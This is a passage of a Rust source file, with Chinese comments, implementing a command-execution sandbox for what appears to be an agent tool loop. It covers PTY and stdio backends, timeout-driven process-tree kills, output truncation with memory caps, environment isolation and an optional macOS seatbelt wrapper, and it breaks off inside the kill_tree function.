// fe-sandbox — PTY 沙箱 (FR-02/03, NFR)
//
// portable-pty 0.8: openpty → spawn(sh -c cmd, setsid 使子为组长) → 阻塞 reader 线程 → child.wait
// 超时: SIGINT (graceful) → 500ms → try_wait 仍活 → SIGKILL (forceful), killpg(-pid) 进程树杀
// 截断: stdout head H=4096 + tail T=8192, 中间折叠 [truncated N chars]
// OOM: 环形缓冲 cap = 2*effective_max; effective_max = max_output_chars.min(HARD_CEILING) 绝对上限
// PTY 合并 stdout+stderr → 全入 stdout (stderr 空; traceback 在 tail 可读)

use std::io::Read;
use std::sync::mpsc as std_mpsc;
use std::time::Duration;

use anyhow::{bail, Context, Result};
use nix::sys::signal::Signal;
use nix::unistd::Pid;
use portable_pty::{NativePtySystem, PtySize, PtySystem};

mod seatbelt;
use serde::{Deserialize, Serialize};
use tokio::sync::mpsc;
use tracing::{debug, info, warn};

const HEAD_CHARS: usize = 4096;
const TAIL_CHARS: usize = 8192;
const DEFAULT_MAX_OUTPUT: usize = 100_000;
/// Issue #8: timeout_sec == 0 视为"未指定" — 绑定到此上限, 永不真正无界 (防 agent loop 卡死)
/// Python 层已拒 timeout<=0; 此为 Rust raw 接口的 defense-in-depth 兜底
const DEFAULT_TIMEOUT_CAP_SEC: f64 = 120.0;
/// C-SB-05: 环形缓冲绝对上限 — 防调用方设 max_output_chars=usize::MAX 打 OOM-kill 主机
const HARD_CEILING: usize = 64 * 1024 * 1024;
/// C-SB-01: SIGINT→SIGKILL grace window
/// 审计 2.4: 50ms 太短 — 大量 buffered IO (git flush/pytest 收集) 来不及落盘即被 SIGKILL,
/// 保证文件损伤。提至 500ms 给优雅退出留足窗口。可配置化需扩 API 面 (YAGNI), 常量足够。
const KILL_GRACE_MS: u64 = 500;
/// C-SB-02/03: kill 后收 reader 输出超时 — 子进程忽略信号时 reader 永不 EOF
const READER_RECV_TIMEOUT_MS: u64 = 2000;

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SandboxResult {
    pub exit_code: i32,
    pub stdout: String,
    /// Issue #4: use_pty=false (stdio 后端) 时独立捕获 fd 2 (stderr-only, FR-03 双工);
    /// use_pty=true (PTY 默认) 时 PTY 合并 stdout+stderr, 本字段恒空, Slicer 吃 stdout tail。
    pub stderr: String,
    pub timed_out: bool,
}

/// 流式事件 — Chunk (实时 stdio 分块) / Done (最终结果, 含截断后 stdout)
#[derive(Debug, Clone, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum StreamEvent {
    Chunk { data: String },
    Done(SandboxResult),
}

#[derive(Debug, Clone)]
pub struct SandboxConfig {
    pub command: String,
    pub cwd: Option<String>,
    pub env: std::collections::HashMap<String, String>,
    pub timeout_sec: f64,
    pub max_output_chars: usize,
    /// Blocker 1 / 1.1: macOS seatbelt 运行时隔离 (sandbox-exec 包装)。
    /// true → sandbox-exec -p '<profile>' sh -c '<cmd>' (禁网 + 危险二进制 process-exec deny)。
    /// 默认 false — 调用方显式开启 (ExecutionRequest.seatbelt 透传)。
    pub seatbelt: bool,
    /// Issue #9: 环境隔离。默认 false → env_clear() + 仅注入最小基线 (PATH/TMPDIR/SHELL) + env。
    /// true → 继承宿主全量 env (旧行为; 受信本地场景显式 opt-in, 文档化泄漏风险)。
    pub inherit_env: bool,
    /// Issue #4: 捕获后端。true(默认)=PTY (ANSI/Traceback 保真, 但 stdout+stderr 合并)。
    /// false=stdio 子进程管道 (stdout/stderr 独立捕获, FR-03 双工; 丢失 PTY 保真)。
    /// 诊断 Slicer 在 stdio 模式直接吃 stderr; PTY 模式吃合并 stdout 的 tail。
    pub use_pty: bool,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            command: String::new(),
            cwd: None,
            env: std::collections::HashMap::new(),
            timeout_sec: 30.0,
            max_output_chars: DEFAULT_MAX_OUTPUT,
            seatbelt: false,
            inherit_env: false,
            use_pty: true,
        }
    }
}

/// Issue #9: 最小安全环境基线 — env_clear 后注入, 保证命令可解析 (PATH) + 有临时目录 (TMPDIR) + 有 shell (SHELL)。
/// PATH 取宿主 PATH (非密钥, 保 python/node/cargo 等工具可解析; 不可用时回退静态 macOS 标准路径)。
/// 不注入 HOME (多数命令不需; 隔离更彻底)。env_vars 覆盖基线 (调用方显式优先)。
const SANDBOX_FALLBACK_PATH: &str = "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin";
const SANDBOX_BASE_SHELL: &str = "/bin/sh";

fn configure_env(cmd: &mut portable_pty::CommandBuilder, cfg: &SandboxConfig) {
    if !cfg.inherit_env {
        cmd.env_clear();
        let path = std::env::var("PATH").unwrap_or_else(|_| SANDBOX_FALLBACK_PATH.to_string());
        cmd.env("PATH", path);
        cmd.env("TMPDIR", std::env::temp_dir());
        cmd.env("SHELL", SANDBOX_BASE_SHELL);
        debug!(
            "env 隔离: env_clear + 基线 PATH/TMPDIR/SHELL ({} env_vars 覆盖)",
            cfg.env.len()
        );
    }
    for (k, v) in &cfg.env {
        cmd.env(k, v);
    }
}

/// Issue #4: stdio 后端环境配置 — 与 configure_env 同语义 (env_clear + 基线 + env_vars),
/// 但作用于 std::process::Command (非 portable-pty CommandBuilder)。
fn configure_std_env(cmd: &mut std::process::Command, cfg: &SandboxConfig) {
    if !cfg.inherit_env {
        cmd.env_clear();
        let path = std::env::var("PATH").unwrap_or_else(|_| SANDBOX_FALLBACK_PATH.to_string());
        cmd.env("PATH", path);
        cmd.env("TMPDIR", std::env::temp_dir());
        cmd.env("SHELL", SANDBOX_BASE_SHELL);
        debug!(
            "env 隔离 (stdio): env_clear + 基线 PATH/TMPDIR/SHELL ({} env_vars 覆盖)",
            cfg.env.len()
        );
    }
    for (k, v) in &cfg.env {
        cmd.env(k, v);
    }
}

/// Issue #4: 收 reader 线程输出 — kill 后 reader 可能永不 EOF, recv_timeout 兜底
fn recv_output(rx: &std_mpsc::Receiver<Result<String>>, pid: Option<u32>, label: &str) -> String {
    match rx.recv_timeout(Duration::from_millis(READER_RECV_TIMEOUT_MS)) {
        Ok(Ok(s)) => s,
        Ok(Err(_)) => {
            warn!(?pid, label, "stdio reader 送了 Err (不应发生)");
            String::new()
        }
        Err(std_mpsc::RecvTimeoutError::Timeout) => {
            warn!(?pid, label, "kill 后 stdio reader 未 EOF, 返回空");
            String::new()
        }
        Err(std_mpsc::RecvTimeoutError::Disconnected) => String::new(),
    }
}

/// 沙箱 — PTY 执行 + 超时 + 截断 + OOM 上限
pub struct Sandbox;

impl Sandbox {
    pub fn new() -> Self {
        info!("Sandbox::new()");
        Self
    }

    pub async fn run(&self, cfg: SandboxConfig) -> Result<SandboxResult> {
        if cfg.command.trim().is_empty() {
            return Ok(SandboxResult {
                exit_code: 0,
                ..Default::default()
            });
        }
        // Issue #4: use_pty=false 走 stdio 后端 (stdout/stderr 独立), 否则 PTY (合并, 默认)
        if !cfg.use_pty {
            return self.run_stdio(cfg).await;
        }
        info!(command = %cfg.command, timeout = cfg.timeout_sec, "sandbox run (PTY)");

        let pty_system = NativePtySystem::default();
        let pair = pty_system
            .openpty(PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            })
            .context("openpty 失败")?;

        // Blocker 1 / 1.1: seatbelt=true → sandbox-exec 包装 (禁网 + 危险二进制 execve deny)
        let mut cmd = seatbelt::build_command(&cfg.command, cfg.seatbelt);
        if let Some(cwd) = &cfg.cwd {
            cmd.cwd(cwd);
        }
        configure_env(&mut cmd, &cfg);

        let mut child = pair
            .slave
            .spawn_command(cmd)
            .context("spawn_command 失败")?;
        let pid = child.process_id();
        debug!(?pid, seatbelt = cfg.seatbelt, "child spawned");

        // 释放 slave — spawn 后不再需要
        drop(pair.slave);

        // reader 阻塞 → 独立线程, 通过 mpsc 传递完整输出
        let effective_max = effective_output_cap(cfg.max_output_chars);
        let max_cap = effective_max.saturating_mul(2);
        let mut reader = pair
            .master
            .try_clone_reader()
            .context("try_clone_reader 失败")?;
        let (tx, rx) = std_mpsc::channel::<Result<String>>();
        let _reader_handle = std::thread::spawn(move || {
            // 环形缓冲: 超过 max_cap 时只保留尾部 effective_max
            let mut buf = Vec::<u8>::with_capacity(8192);
            let mut tmp = [0u8; 4096];
            loop {
                match reader.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() > max_cap {
                            let keep = buf.len().saturating_sub(effective_max);
                            buf.drain(0..keep);
                        }
                    }
                    Err(e) => {
                        // 审计 2.8: 旧版 send(Err) 后 buf drop — 超时命令已收的 partial stdout
                        // (含 traceback) 全丢。改 send Ok(buf) 保留已收部分, 仅记 warn 不短路。
                        let partial = String::from_utf8_lossy(&buf).into_owned();
                        let _ = tx.send(Ok(partial));
                        warn!(error = %e, "reader read 失败, 返回已收 partial 输出");
                        return;
                    }
                }
            }
            let s = String::from_utf8_lossy(&buf).into_owned();
            let _ = tx.send(Ok(s));
        });

        // take_writer 持有到子进程结束 — 不送 EOF, 避免 PTY 回显 ^D/退格污染输出 (L-SB-07 折中)
        // L-SB-07: 本沙箱不提供 stdin, 读 stdin 命令 (cat) 将阻塞到 timeout 被 kill (kill_tree 兜底)
        // 不通过 drop writer 发 EOF — portable-pty PTY drop 会回显控制字符污染 stdout
        let _writer = pair.master.take_writer().context("take_writer 失败")?;

        // wait 阻塞 → spawn_blocking; 超时 → SIGINT→500ms→SIGKILL 进程树杀 (C-SB-01/04)
        let wait_fut = tokio::task::spawn_blocking(move || child.wait());
        // Issue #8 / L-SB-06: timeout<0 拒绝 (调用方 bug); timeout==0 绑定 DEFAULT_TIMEOUT_CAP_SEC,
        // 永不真正无界 (FR-02 bounded execution; 防 agent loop 卡死)。Python 层已拒 <=0, 此为 raw 接口兜底
        if cfg.timeout_sec < 0.0 {
            drop(pair.master);
            bail!("timeout_sec 不能为负: {}", cfg.timeout_sec);
        }
        let effective_timeout = if cfg.timeout_sec == 0.0 {
            DEFAULT_TIMEOUT_CAP_SEC
        } else {
            cfg.timeout_sec
        };
        let timeout_dur = Duration::from_secs_f64(effective_timeout);
        let sleep = tokio::time::sleep(timeout_dur);

        let (timed_out, raw_exit) = tokio::select! {
            biased; // L-SB-01: wait 优先 — 干净退出时不误报 -124
            join_res = wait_fut => {
                drop(_writer);
                drop(pair.master);
                let status = join_res
                    .map_err(|e| anyhow::anyhow!("wait 线程 panic: {e}"))?
                    .context("wait 失败")?;
                (false, status.exit_code() as i32)
            }
            _ = sleep => {
                warn!(?pid, timeout_sec = effective_timeout, "超时, kill 进程组");
                let exit = kill_tree(pid);
                drop(_writer);
                drop(pair.master);
                (true, exit)
            }
        };

        // C-SB-02: kill 后 reader 可能永不 EOF (子进程忽略信号, 持 slave fd)
        // — rx.recv 加超时, 超时则返回已收部分输出
        let raw_output = match rx.recv_timeout(Duration::from_millis(READER_RECV_TIMEOUT_MS)) {
            Ok(Ok(s)) => s,
            // 审计 2.8: reader 2.8 修复后从不送 Err, 此分支保留兜底 — 送 Err 意味逻辑
            // 漏改, 返已收部分 (channel 在 Err 时 buf 已 drop 无法回收, 故空) 记 warn。
            Ok(Err(_)) => {
                warn!(?pid, "reader 送了 Err (不应发生, 2.8 修复后走 Ok partial)");
                String::new()
            }
            Err(std_mpsc::RecvTimeoutError::Timeout) => {
                warn!(?pid, "kill 后 reader 未 EOF, 返回已收部分输出");
                String::new()
            }
            Err(std_mpsc::RecvTimeoutError::Disconnected) => String::new(),
        };

        // PTY ONLCR 把 \n 转 \r\n — 归一化 CRLF→LF (保留程序输出的独立 \r 如进度条)
        let normalized = raw_output.replace("\r\n", "\n");
        let stdout = truncate_output(&normalized, effective_max);
        debug!(out_len = stdout.len(), timed_out, "sandbox run 完成");

        Ok(SandboxResult {
            exit_code: raw_exit,
            stdout,
            stderr: String::new(),
            timed_out,
        })
    }

    /// Issue #4: stdio 后端 — std::process::Command + 独立 Stdio::piped (stdout/stderr 分离)。
    /// 非 PTY: 丢失 ANSI/Traceback 保真, 但满足 FR-03 双工捕获 + Slicer 直接吃 stderr。
    /// 复用截断/OOM-cap/超时/SIGINT→SIGKILL 进程树杀语义 (与 PTY run() 等价)。
    async fn run_stdio(&self, cfg: SandboxConfig) -> Result<SandboxResult> {
        info!(command = %cfg.command, timeout = cfg.timeout_sec, "sandbox run (stdio, 分离 stdout/stderr)");
        let mut cmd = seatbelt::build_std_command(&cfg.command, cfg.seatbelt);
        if let Some(cwd) = &cfg.cwd {
            cmd.current_dir(cwd);
        }
        configure_std_env(&mut cmd, &cfg);
        cmd.stdin(std::process::Stdio::null());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());

        let mut child = cmd.spawn().context("spawn (stdio) 失败")?;
        let pid: Option<u32> = Some(child.id());
        debug!(?pid, "child spawned (stdio)");
        // 取出 stdout/stderr handle 后移走 child 剩余引用供 wait
        let mut stdout_handle = child.stdout.take().context("stdout piped 失败")?;
        let mut stderr_handle = child.stderr.take().context("stderr piped 失败")?;

        let effective_max = effective_output_cap(cfg.max_output_chars);
        let max_cap = effective_max.saturating_mul(2);
        let tail_cap = effective_max;

        // stdout reader 线程 — 环形缓冲 (与 PTY 一致 OOM-cap)
        let (out_tx, out_rx) = std_mpsc::channel::<Result<String>>();
        let _out_handle = std::thread::spawn(move || {
            let mut buf = Vec::<u8>::with_capacity(8192);
            let mut tmp = [0u8; 4096];
            loop {
                match stdout_handle.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() > max_cap {
                            let keep = buf.len().saturating_sub(tail_cap);
                            buf.drain(0..keep);
                        }
                    }
                    Err(e) => {
                        let partial = String::from_utf8_lossy(&buf).into_owned();
                        let _ = out_tx.send(Ok(partial));
                        warn!(error = %e, "stdio stdout reader 失败, 返回已收 partial");
                        return;
                    }
                }
            }
            let s = String::from_utf8_lossy(&buf).into_owned();
            let _ = out_tx.send(Ok(s));
        });

        // stderr reader 线程 — 独立缓冲 (Issue #4 核心分离)
        let (err_tx, err_rx) = std_mpsc::channel::<Result<String>>();
        let _err_handle = std::thread::spawn(move || {
            let mut buf = Vec::<u8>::with_capacity(8192);
            let mut tmp = [0u8; 4096];
            loop {
                match stderr_handle.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() > max_cap {
                            let keep = buf.len().saturating_sub(tail_cap);
                            buf.drain(0..keep);
                        }
                    }
                    Err(e) => {
                        let partial = String::from_utf8_lossy(&buf).into_owned();
                        let _ = err_tx.send(Ok(partial));
                        warn!(error = %e, "stdio stderr reader 失败, 返回已收 partial");
                        return;
                    }
                }
            }
            let s = String::from_utf8_lossy(&buf).into_owned();
            let _ = err_tx.send(Ok(s));
        });

        // wait + 超时 (复用 timeout 边界规则 + kill_tree)
        if cfg.timeout_sec < 0.0 {
            bail!("timeout_sec 不能为负: {}", cfg.timeout_sec);
        }
        let effective_timeout = if cfg.timeout_sec == 0.0 {
            DEFAULT_TIMEOUT_CAP_SEC
        } else {
            cfg.timeout_sec
        };
        let timeout_dur = Duration::from_secs_f64(effective_timeout);
        let wait_fut = tokio::task::spawn_blocking(move || child.wait());
        let sleep = tokio::time::sleep(timeout_dur);

        let (timed_out, raw_exit) = tokio::select! {
            biased;
            join_res = wait_fut => {
                let status = join_res
                    .map_err(|e| anyhow::anyhow!("wait 线程 panic: {e}"))?
                    .context("wait 失败")?;
                (false, status.code().unwrap_or(-1))
            }
            _ = sleep => {
                warn!(?pid, timeout_sec = effective_timeout, "超时 (stdio), kill 进程组");
                let exit = kill_tree(pid);
                (true, exit)
            }
        };

        let raw_stdout = recv_output(&out_rx, pid, "stdout");
        let raw_stderr = recv_output(&err_rx, pid, "stderr");
        // stdio 无 PTY ONLCR 回显, 无 CRLF 归一化需求
        let stdout = truncate_output(&raw_stdout, effective_max);
        let stderr = truncate_output(&raw_stderr, effective_max);
        debug!(
            out_len = stdout.len(),
            err_len = stderr.len(),
            timed_out,
            "sandbox run (stdio) 完成"
        );

        Ok(SandboxResult {
            exit_code: raw_exit,
            stdout,
            stderr,
            timed_out,
        })
    }

    /// 流式执行 — stdio 实时分块推送, 结束发送最终 SandboxResult。
    /// 返回 (Receiver<StreamEvent>, JoinHandle) — 调用方消费 Receiver 直到收到 Done。
    /// 非破坏性: 与 run() 并存, 逻辑等价 (head+tail 截断在 Done 内的 stdout 完成)。
    pub fn run_streaming(
        &self,
        cfg: SandboxConfig,
    ) -> Result<(mpsc::Receiver<StreamEvent>, tokio::task::JoinHandle<()>)> {
        if cfg.command.trim().is_empty() {
            let (tx, rx) = mpsc::channel(8);
            let handle = tokio::spawn(async move {
                let _ = tx
                    .send(StreamEvent::Done(SandboxResult {
                        exit_code: 0,
                        ..Default::default()
                    }))
                    .await;
            });
            return Ok((rx, handle));
        }
        info!(command = %cfg.command, timeout = cfg.timeout_sec, "sandbox run_streaming");

        let pty_system = NativePtySystem::default();
        let pair = pty_system
            .openpty(PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            })
            .context("openpty 失败")?;

        let mut cmd = seatbelt::build_command(&cfg.command, cfg.seatbelt);
        if let Some(cwd) = &cfg.cwd {
            cmd.cwd(cwd);
        }
        configure_env(&mut cmd, &cfg);

        let mut child = pair
            .slave
            .spawn_command(cmd)
            .context("spawn_command 失败")?;
        let pid = child.process_id();
        debug!(?pid, seatbelt = cfg.seatbelt, "child spawned (streaming)");
        drop(pair.slave);

        // reader 线程 — 实时分块 (inner_tx) + 环形缓冲; EOF 时送最终完整累积 (inner_tx)
        let effective_max = effective_output_cap(cfg.max_output_chars);
        let max_cap = effective_max.saturating_mul(2);
        let mut reader = pair
            .master
            .try_clone_reader()
            .context("try_clone_reader 失败")?;
        enum ReaderMsg {
            Chunk(String),
            Eof(String),
        }
        let (inner_tx, mut inner_rx) = mpsc::channel::<ReaderMsg>(64);
        let _reader_handle = std::thread::spawn(move || {
            let mut buf = Vec::<u8>::with_capacity(8192);
            let mut tmp = [0u8; 4096];
            // L-SB-02: 跨块多字节 UTF-8 — 保留尾部不完整字节带入下块
            let mut pending: Vec<u8> = Vec::new();
            let mut overflow_marked = false;
            loop {
                match reader.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() > max_cap {
                            let keep = buf.len().saturating_sub(effective_max);
                            buf.drain(0..keep);
                        }
                        // L-SB-02: 合并 pending, 只解码到最后完整字符边界
                        let mut combined = std::mem::take(&mut pending);
                        combined.extend_from_slice(&tmp[..n]);
                        let safe = utf8_safe_prefix_len(&combined);
                        let decodable = &combined[..safe];
                        pending = combined[safe..].to_vec();
                        let chunk = String::from_utf8_lossy(decodable).replace("\r\n", "\n");
                        if !chunk.is_empty() {
                            // L-SB-03: 通道满/关闭 — 满则发 overflow 标记一次, 关闭则退出
                            if inner_tx.blocking_send(ReaderMsg::Chunk(chunk)).is_err() {
                                warn!("streaming 通道关闭, 停止读循环");
                                break;
                            }
                            if !overflow_marked && inner_tx.capacity() == 0 {
                                overflow_marked = true;
                                let _ = inner_tx
                                    .blocking_send(ReaderMsg::Chunk("[stream overflow]\n".into()));
                            }
                        }
                    }
                    Err(e) => {
                        // 审计 2.8: 旧版送 Eof(空) — buf drop 丢 partial stdout。改送 Eof(buf)
                        // 保留已收部分 (含 traceback), Done 内 stdout 携 partial。
                        let partial = String::from_utf8_lossy(&buf).into_owned();
                        let _ = inner_tx.blocking_send(ReaderMsg::Eof(partial));
                        warn!("streaming read 失败, 送已收 partial 输出: {e}");
                        return;
                    }
                }
            }
            let s = String::from_utf8_lossy(&buf).into_owned();
            let _ = inner_tx.blocking_send(ReaderMsg::Eof(s));
        });

        // take_writer 持有到结束 — 同 run(), 不发 EOF 避免 PTY 回显污染 (L-SB-07 折中)
        let _writer = pair.master.take_writer().context("take_writer 失败")?;
        let wait_fut = tokio::task::spawn_blocking(move || child.wait());
        // Issue #8 / L-SB-06: timeout<0 拒绝; timeout==0 绑定 DEFAULT_TIMEOUT_CAP_SEC, 永不真正无界
        if cfg.timeout_sec < 0.0 {
            drop(pair.master);
            bail!("timeout_sec 不能为负: {}", cfg.timeout_sec);
        }
        let effective_timeout = if cfg.timeout_sec == 0.0 {
            DEFAULT_TIMEOUT_CAP_SEC
        } else {
            cfg.timeout_sec
        };
        let timeout_dur = Duration::from_secs_f64(effective_timeout);
        let max_output_final = effective_output_cap(cfg.max_output_chars);

        // 协调任务 — 转发 chunk 到 outer; wait/timeout 并行; EOF+exit 后发 Done
        let (outer_tx, outer_rx) = mpsc::channel::<StreamEvent>(64);
        // Blocker 6 (审计 2.1): 消费者断开 → kill 子进程, 防孤儿。pid 克隆供 phase-1 循环用
        // (exit_fut 闭包也需 pid 作超时 kill, 克隆避免 move 后无法引用)
        let pid_for_cancel = pid;
        let handle = tokio::spawn(async move {
            // exit future: wait 或 timeout, 先到者决定 (timed_out, raw_exit)
            let mut exit_fut = Box::pin(async move {
                tokio::select! {
                    biased; // L-SB-01: wait 优先
                    join_res = wait_fut => {
                        drop(_writer);
                        drop(pair.master);
                        match join_res {
                            Ok(Ok(status)) => (false, status.exit_code() as i32),
                            _ => {
                                warn!("wait 线程 panic/失败");
                                (false, -1)
                            }
                        }
                    }
                    _ = tokio::time::sleep(timeout_dur) => {
                        warn!(?pid, timeout_sec = effective_timeout, "超时, kill 进程组 (streaming)");
                        let exit = kill_tree(pid);
                        drop(_writer);
                        drop(pair.master);
                        (true, exit)
                    }
                }
            });

            let mut eof_output: Option<String> = None;
            let mut exit_done: Option<(bool, i32)> = None;
            // Blocker 6: 消费者断开标志 — send 失败后 kill 子进程并跳出
            let mut cancelled = false;

            // 阶段 1: exit 与 chunk 并发 — 未收到 exit 前无超时收 chunk
            while exit_done.is_none() {
                tokio::select! {
                    biased; // L-SB-01: exit 优先
                    e = &mut exit_fut => {
                        exit_done = Some(e);
                    }
                    // Blocker 6: 消费者断开 outer_rx (即使无输出静默期) → closed() 就绪 → kill 子进程
                    _ = outer_tx.closed() => {
                        warn!(?pid_for_cancel, "streaming 消费者断开 (closed), kill 子进程防孤儿 (Blocker 6)");
                        let _ = kill_tree(pid_for_cancel);
                        cancelled = true;
                        break;
                    }
                    msg = inner_rx.recv() => {
                        match msg {
                            Some(ReaderMsg::Chunk(c)) => {
                                // Blocker 6: send 失败 = 消费者断开 outer_rx → kill 子进程, 跳出
                                if outer_tx.send(StreamEvent::Chunk { data: c }).await.is_err() {
                                    warn!(?pid_for_cancel, "streaming 消费者断开, kill 子进程防孤儿 (Blocker 6)");
                                    let _ = kill_tree(pid_for_cancel);
                                    cancelled = true;
                                    break;
                                }
                            }
                            Some(ReaderMsg::Eof(s)) => {
                                eof_output = Some(s);
                            }
                            None => {
                                if eof_output.is_none() {
                                    eof_output = Some(String::new());
                                }
                            }
                        }
                    }
                }
            }
            // Blocker 6: 消费者断开后 exit_fut 仍持 wait_fut, abort 释放; 子进程已 kill。
            // 不走 phase-2 (exit_done=None → unwrap panic); 直接合成 cancelled Done 收尾。
            if cancelled {
                debug!(?pid_for_cancel, "streaming 已取消 (消费者断开), 收尾");
                let raw_output = eof_output.unwrap_or_default();
                let stdout = truncate_output(&raw_output.replace("\r\n", "\n"), max_output_final);
                let _ = outer_tx
                    .send(StreamEvent::Done(SandboxResult {
                        exit_code: -1,
                        stdout,
                        stderr: String::new(),
                        timed_out: false,
                    }))
                    .await;
                return;
            }

            // 阶段 2: exit 已到 — 排空 reader 直到 EOF/None。
            // C-SB-03 grace 超时防 reader 永不 EOF。必须循环: exit 先于 reader 刷盘时,
            // reader 可能仍持多条 Chunk + 末尾 Eof; 单次 recv 只取一条会漏掉 Eof,
            // 导致 eof_output 留 None → unwrap_or_default 空串 → done.stdout 丢全部输出
            // (CI 慢机 echo hi 竞态: exit 比 PTY flush 快)。
            if eof_output.is_none() {
                let deadline =
                    tokio::time::Instant::now() + Duration::from_millis(READER_RECV_TIMEOUT_MS);
                loop {
                    match tokio::time::timeout_at(deadline, inner_rx.recv()).await {
                        Ok(Some(ReaderMsg::Chunk(c))) => {
                            let _ = outer_tx.send(StreamEvent::Chunk { data: c }).await;
                        }
                        Ok(Some(ReaderMsg::Eof(s))) => {
                            eof_output = Some(s);
                            break;
                        }
                        Ok(None) => {
                            eof_output = Some(String::new());
                            break;
                        }
                        Err(_) => {
                            warn!(?pid, "streaming kill 后 reader 未 EOF, 合成空 eof");
                            eof_output = Some(String::new());
                            break;
                        }
                    }
                }
            }

            let (timed_out, raw_exit) = exit_done.unwrap();
            let raw_output = eof_output.unwrap_or_default();
            let normalized = raw_output.replace("\r\n", "\n");
            let stdout = truncate_output(&normalized, max_output_final);
            debug!(
                out_len = stdout.len(),
                timed_out, "sandbox run_streaming 完成"
            );
            let _ = outer_tx
                .send(StreamEvent::Done(SandboxResult {
                    exit_code: raw_exit,
                    stdout,
                    stderr: String::new(),
                    timed_out,
                }))
                .await;
        });

        Ok((outer_rx, handle))
    }
}

impl Default for Sandbox {
    fn default() -> Self {
        Self::new()
    }
}

/// head + tail 截断 — 中间折叠为 [truncated N chars]
/// L-SB-04: 极小上限 tail-only 回退保证返回不超 max
/// 审计 2.5: 旧版 chars().collect::<Vec<char>> 物化全量 char Vec — 64MB 输入峰值 320MB
/// (Vec<char> 每元素 4 字节 + 原 String)。改 byte-offset: char_indices 一次遍历记录
/// 第 N 个 char 的字节偏移, 切片原 str — 零额外物化 (仅 Vec<usize> 偏移, N 个 8 字节)。
pub fn truncate_output(s: &str, max: usize) -> String {
    if max == 0 {
        return String::new();
    }
    // 一次遍历取所有 char 的字节起点偏移 — 单 Vec<usize> (N*8 字节) 远小于 Vec<char> (N*4)
    // 但 char_indices 已逐 char 产出, 峰值 = 偏移表; 全量 ASCII 64MB → 512MB 偏移表仍大。
    // 故仅取需要的 3 个边界偏移 (head 尾, tail 头, total), 不存全表。
    let total_chars = s.chars().count();
    if total_chars <= max {
        return s.to_string();
    }
    if max <= HEAD_CHARS + TAIL_CHARS {
        // 极小上限: 只保留尾部 max 个 char — 找第 (total-max) 个 char 的字节偏移
        let skip = total_chars.saturating_sub(max);
        let byte_start = nth_char_byte_offset(s, skip);
        return s[byte_start..].to_string();
    }
    let head_end_byte = nth_char_byte_offset(s, HEAD_CHARS);
    let tail_start_char = total_chars - TAIL_CHARS;
    let tail_start_byte = nth_char_byte_offset(s, tail_start_char);
    let dropped = total_chars - HEAD_CHARS - TAIL_CHARS;
    let out = format!(
        "{}\n[truncated {} chars]\n{}",
        &s[..head_end_byte],
        dropped,
        &s[tail_start_byte..]
    );
    // L-SB-04: head+marker+tail 超 max 时回退 tail-only
    if out.chars().count() > max {
        let skip = total_chars.saturating_sub(max);
        let byte_start = nth_char_byte_offset(s, skip);
        return s[byte_start..].to_string();
    }
    out
}

/// 返回第 `n` 个 char (0-indexed) 的字节起始偏移。n==0 → 0; n>=总 char 数 → s.len()
/// 审计 2.5: 取代全量 chars().collect(), 仅遍历到第 n 个停, 零物化。
fn nth_char_byte_offset(s: &str, n: usize) -> usize {
    if n == 0 {
        return 0;
    }
    for (seen, (i, _)) in s.char_indices().enumerate() {
        if seen == n {
            return i;
        }
    }
    s.len()
}

/// L-SB-02: 返回最后一个完整 UTF-8 字符的字节边界 (切断多字节序列时余数留给下块)
/// 无效字节 (孤立续字节) 整体跳过 — from_utf8_lossy 转 U+FFFD
fn utf8_safe_prefix_len(bytes: &[u8]) -> usize {
    if bytes.is_empty() {
        return 0;
    }
    // 从末尾回溯找完整序列起点
    let n = bytes.len();
    let mut i = n;
    while i > 0 {
        let last = bytes[i - 1];
        if last < 0x80 {
            // ASCII — 完整单字节
            return i;
        }
        if last & 0xC0 == 0x80 {
            // 续字节 (10xxxxxx) — 继续回溯找首字节
            i -= 1;
            // 一个 UTF-8 字符最多 4 字节, 避免无限回溯
            if n - i > 3 {
                return n;
            }
            continue;
        }
        // 首字节 — 校验后续续字节数是否足够
        let need = if last & 0xE0 == 0xC0 {
            1
        } else if last & 0xF0 == 0xE0 {
            2
        } else if last & 0xF8 == 0xF0 {
            3
        } else {
            // 非法首字节 — 当作完整, lossy 转 U+FFFD
            return n;
        };
        let have = n - (i - 1);
        if have > need {
            return n;
        }
        // 不完整多字节序列 — 截断在此, 余数留下块
        return i - 1;
    }
    0
}

/// C-SB-05: 输出上限钳制 — 调用方 max_output_chars 受 HARD_CEILING (64MB) 绝对上限约束
pub fn effective_output_cap(cfg_max: usize) -> usize {
    cfg_max.min(HARD_CEILING)
}

/// C-SB-01/04: 进程树杀 — SIGINT (graceful) → KILL_GRACE_MS → 仍活 → SIGKILL
/// portable-pty setsid 使子进程为组长, killpg(-pid) 杀整组 (含孙子)
/// pid=None (spawn 失败) → 无操作返回 -1
/// P-SB-04: kill EPERM/EINVAL 报错, ESRCH (进程已退) 当 ok
/// 返回 -124 (超时约定) 或子进程被信号杀的退出码
pub fn kill_tree(pid: Option<u32>) -> i32 {
    let Some(pid) = pid else {
        warn!("kill_tree: 无 pid (spawn 失败?), 跳过");
        return -1;
    };
    let pgid = Pid::from_raw(-(pid as i32));
    let pid_nix = Pid::from_raw(pid as i32);

    // SIGINT 优雅终止
    match nix::sys::signal::killpg(pgid, Signal::SIGINT) {
        Ok(()) => debug!(?pid, "killpg SIGINT 已发"),
        Err(nix::errno::Errno::ESRCH) => {
            debug!(?pid, "SIGINT: 进程已退 (ESRCH)");
            return -124;
        }
        Err(e) => {
            warn!(?pid, "killpg SIGINT 失败: {e}");
            // 不立即放弃 — 继续 SIGKILL 兜底
        }
    }

    // grace window 等优雅退出
    std::thread::sleep(Duration::from_millis(KILL_GRACE_MS));

